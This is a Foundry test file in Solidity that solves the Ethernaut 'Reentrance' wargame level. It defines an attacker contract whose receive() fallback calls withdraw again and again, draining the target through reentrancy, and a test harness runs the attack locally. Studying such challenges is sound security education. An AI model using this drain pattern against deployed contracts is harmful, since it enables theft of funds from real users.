// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {ReentranceFactory} from "../src/levels/10-ReentranceFactory.sol";
import {Reentrance} from "../src/levels/10-Reentrance.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract Reentrooor {
    Reentrance private target;
    uint256 private calls = 0;
    constructor(Reentrance _target) {
        target = _target;
    }

    function deposit() public payable {
        target.donate{value: msg.value}(address(this));
    }
    function attack() public {
        target.withdraw(0.001 ether);
    }

    receive() external payable {
        if(calls++ > 2) return;
        target.withdraw(0.001 ether);
    }
}

contract ReentranceSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    ReentranceFactory internal factory;

    function solution(Reentrance target) internal {
        Reentrooor reentrooor = new Reentrooor(target);
        reentrooor.deposit{value: 0.001 ether}();
        reentrooor.attack();
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new ReentranceFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
        Reentrance kingContract = Reentrance(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(kingContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
